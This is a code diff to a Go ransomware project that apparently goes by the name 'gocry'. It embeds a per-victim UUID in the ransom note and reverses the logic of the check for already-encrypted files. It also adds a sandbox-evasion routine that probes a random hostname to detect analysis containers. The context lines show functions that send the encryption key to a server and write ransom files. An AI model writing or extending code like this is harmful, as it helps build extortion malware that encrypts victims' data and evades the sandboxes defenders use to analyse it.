@@ -5,6 +5,7 @@ import (
 	"errors"
 	"fmt"
 	"io/ioutil"
+	"net/http"
 	"os"
 	"path/filepath"
 	"strings"
@@ -14,6 +15,7 @@ import (
 	"github.com/nireo/gocry/crypt"
 	"github.com/nireo/gocry/utils"
 	"github.com/nireo/gocry/victim"
+	uuid "github.com/satori/go.uuid"
 )
 
 // Ransomware holds all the needed client information needed to go forward with the ransom.
@@ -53,7 +55,7 @@ func (rw *Ransomware) CreateRansomInfoFile(message string) error {
 	}
 	defer file.Close()
 
-	if _, err := file.WriteString(message); err != nil {
+	if _, err := file.WriteString(fmt.Sprintf(message, rw.Data.UUID)); err != nil {
 		return errors.New("could not write message to file: " + err.Error())
 	}
 
@@ -76,10 +78,10 @@ func checkIfEncrypted(rootPath string) bool {
 
 		return nil
 	}); err != nil {
-		return false
+		return true
 	}
 
-	return true
+	return false
 }
 
 // GetValidKeyFromServer sends a post request which contains the encryption key and then the
@@ -178,6 +180,19 @@ func (rw *Ransomware) SendKeyToServer() error {
 	}
 
 	return nil
+}
+
+// Check if the ransomware is started in a container which allows all of the urls and ports.
+func (rw *Ransomware) CheckIfInContainer() error {
+	urlTest, err := uuid.NewV4()
+	if err != nil {
+		return err
+	}
+
+	if _, err := http.Get("https://" + urlTest.String() + ":1234"); err != nil {
+		return nil
+	}
+	return errors.New("in container")
 }
 
 // NewRansomware creates a new ransomware instance given a starting directory.
